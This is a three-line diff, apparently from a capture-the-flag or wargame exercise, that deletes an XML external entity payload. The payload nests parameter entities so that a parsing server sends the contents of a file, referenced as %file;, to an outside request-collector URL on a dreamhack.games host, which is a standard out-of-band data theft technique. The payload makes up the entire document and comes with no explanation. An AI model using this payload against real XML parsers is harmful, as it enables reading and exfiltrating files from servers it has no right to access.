@@ -1,3 +1,0 @@
-<!ENTITY % run "
-<!ENTITY &#x25; result SYSTEM 'https://ejlrywt.request.dreamhack.games/%file;'>
-"> %run; %result;
